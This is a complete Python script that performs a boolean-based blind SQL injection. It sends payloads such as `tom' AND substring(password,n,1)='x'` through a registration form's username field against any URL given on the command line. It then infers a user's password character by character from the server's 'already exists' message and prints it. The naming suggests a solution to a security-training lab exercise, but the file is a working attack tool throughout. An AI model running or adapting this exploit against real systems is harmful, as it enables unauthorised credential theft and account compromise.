#!/usr/bin/env python

import argparse
import json
import requests

# Define function to perform advanced SQL injection


def sql_injection_advance_5(url, cookie):
    alphabet_index = 0
    alphabet = 'abcdefghijklmnopqrstuvwxyz'
    password_index = 0
    password = ''

    # Setting up the headers with the given cookie
    headers = {
        'Cookie': f'JSESSIONID={cookie}',
    }

    while True:
        # Define SQL payload
        payload = f'tom\' AND substring(password,{password_index + 1},1)=\'{alphabet[alphabet_index]}'

        # Define data to be sent
        data = {
            'username_reg': payload,
            'email_reg': 'a@a',
            'password_reg': 'a',
            'confirm_password_reg': 'a'
        }

        # Make the request
        r = requests.put(url, headers=headers, data=data)

        try:
            response = json.loads(r.text)
        except:
            print("Wrong JSESSIONID, find it by looking at your requests once logged in.")
            return

        # Check if password exists
        if "already exists please try to register with a different username" not in response['feedback']:
            alphabet_index += 1
            if alphabet_index > len(alphabet) - 1:
                return password
        else:
            password += alphabet[alphabet_index]
            alphabet_index = 0
            password_index += 1


def main(url, cookie):
    # Call the SQL injection function and print the password

    passwd = sql_injection_advance_5(url, cookie)
    print("this is the password: ", passwd)


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Script for SQL injection')
    parser.add_argument('-u', '--url', help='URL of the target', required=True)
    parser.add_argument('-c', '--cookie', help='Cookie value', required=True)

    args = parser.parse_args()

    main(args.url, args.cookie)
